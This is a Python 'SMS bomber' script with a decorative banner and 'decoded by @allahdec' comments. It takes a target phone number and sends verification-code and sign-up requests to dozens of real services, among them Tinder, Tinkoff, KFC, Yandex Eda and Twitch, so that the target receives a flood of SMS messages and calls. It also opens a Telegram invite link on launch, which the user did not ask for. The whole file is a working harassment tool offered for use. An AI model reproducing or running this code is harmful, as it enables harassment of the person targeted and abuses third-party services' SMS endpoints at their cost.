#Декоднул @allahdec.
__import__("webbrowser").open("https://t.me/+-aF7ZoooDo5mYmVi")


import requests  #Декоднул @allahdec.
import random  #Декоднул @allahdec.
import datetime  #Декоднул @allahdec.
import sys  #Декоднул @allahdec.
import time  #Декоднул @allahdec.
import argparse  #Декоднул @allahdec.
import os  #Декоднул @allahdec.
from termcolor import colored  #Декоднул @allahdec.

if os.name == 'nt':  #Декоднул @allahdec.
    os.system('cls')
else:  #Декоднул @allahdec.
    os.system('clear')

banner = """


 ███▄ ▄███▓▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ██▀███ ▓██   ██▓
▓██▒▀█▀ ██▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▒██  ██▒
▓██    ▓██░  ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒ ▒██ ██░
▒██    ▒██   ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄   ░ ▐██▓░
▒██▒   ░██▒  ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒ ░ ██▒▓░
░ ▒░   ░  ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░  ██▒▒▒ 
░  ░      ░ ▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░▓██ ░▒░ 
░      ░    ▒ ▒ ░░  ░  ░  ░    ░         ░     ░░   ░ ▒ ▒ ░░  
       ░    ░ ░           ░              ░  ░   ░     ░ ░     
            ░ ░                                       ░ ░     

  """

print(colored(banner, 'magenta'))

_phone = input('Введите номер телефона\n └ [Пример: 79999993993]: ')

if _phone[0] == '+':  #Декоднул @allahdec.
    _phone = _phone[1:]

if _phone[0] == '8':  #Декоднул @allahdec.
    _phone = '7' + _phone[1:]

if _phone[0] == '9':  #Декоднул @allahdec.
    _phone = '7' + _phone

_name = ''

for x in range(12):  #Декоднул @allahdec.
    _name += random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))  #Декоднул @allahdec.
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    iteration = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+' + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phone9dostavista = '+' + _phone9[:3] + '-' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
_phoneOstin = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]

_email = _name + iteration + '@gmail.com'
email = _name + iteration + '@gmail.com'

try:  #Декоднул @allahdec.
    requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    print('[+] Grab отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()['res']
    print('[+] RuTaxi отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
    print('[+] BelkaCar отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
    print('[+] Tinder отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
    print('[+] Karusel отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
    print('[+] Tinkoff отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
    print('[+] MTS отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
    print('[+] Youla отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by': 'pass-recovery', 'action_id': _phonePizzahut, 'phone': _phone, '_token': '*'})
    print('[+] PizzaHut отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
    print('[+] Rabota отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
    print('[+] Rutube отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
    print('[+] Smsint отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
    print('[+] oyorooms отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false', 'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''}, data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
    print('[+] MVideo отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}}, 'query': 'mutation registration($client: ClientInput!) {\n  registration(client: $client) {\n    token\n    __typename\n  }\n}\n'})
    print('[+] newnext отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
    print('[+] Sunlight отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
    print('[+] alpari отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
    print('[+] Invitro отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика', 'params': {'phone': _phone}, 'id': '1'})
    print('[+] Sberbank отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1', 'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': True, 'isDSA': False, 'personalDataProcessingAgreement': True, 'bKIRequestAgreement': 'null', 'promotionAgreement': True})
    print('[+] Psbank отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
    print('[+] Beltelcom отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
    print('[+] Karusel отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
    print('[+] KFC отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.carsmile.com/', json={'operationName': 'enterPhone', 'variables': {'phone': _phone}, 'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
    print('[+] carsmile отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone)
    print('[+] Citilink отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.delitime.ru/api/v2/signup', data={'SignupForm[username]': _phone, 'SignupForm[device_type]': '3'})
    print('[+] Delitime отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
    print('[+] findclone звонок отправлен!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://guru.taxi/api/v1/driver/session/verify', json={'code': '1', 'number': _phone})
    print('[+] Guru отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, 'locale': 'en', 'countryCode': 'ru', 'version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'})
    print('[+] ICQ отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru', data={'mode': 'request', 'phone': '+' + _phone, 'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6', 'osversion': 'unknown', 'devicemodel': 'unknown'})
    print('[+] InDriver отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'password': password, 'application': 'lkp', 'login': '+' + _phone})
    print('[+] Invitro отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={'phone': _phone})
    print('[+] Pmsm отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={'phone': _phone})
    print('[+] IVI отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    class self:  #Декоднул @allahdec.
        formatted_phone = '+' + _phone

    requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + self.formatted_phone})
    print('[+] Lenta отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={'phone': '+' + _phone, 'api': 2, 'email': 'email', 'x-email': 'x-email'})
    print('[+] Mail.ru отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={'pageName': 'registerPrivateUserPhoneVerificatio'}, data={'phone': _phone, 'recaptcha': 'off', 'g-recaptcha-response': ''})
    print('[+] MVideo отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={'st.r.phone': '+' + _phone})
    print('[+] OK отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://plink.tech/register/', json={'phone': _phone})
    print('[+] Plink отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code', json={'phone': _phone})
    print('[+] qlean отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('http://smsgorod.ru/sendsms.php', data={'number': _phone})
    print('[+] SMSgorod отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
    print('[+] Tinder отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://passport.twitch.tv/register?trusted_request=true', json={'birthday': {'day': 11, 'month': 11, 'year': 1999}, 'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True, 'password': password, 'phone_number': _phone, 'username': username})
    print('[+] Twitch отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone}, headers={'App-ID': 'cabinet'})
    print('[+] CabWiFi отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api.wowworks.ru/v2/site/send-code', json={'phone': _phone, 'type': 2})
    print('[+] wowworks отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone})
    print('[+] Eda.Yandex отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
    print('[+] Youla отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': f'{email}@gmail.ru', 'mobile_phone': _phone, 'deliveryOption': 'sms'})
    print('[+] Alpari отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone})
    print('[+] SMS отправлено!')
except:  #Декоднул @allahdec.
    print('[-] не отправлено!')

try:  #Декоднул @allahdec.
    requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': _phone})
    print('[+] Delivery отправлено!')
except:  #Декоднул @allahdec.
    print('[-] Не отправлено!')
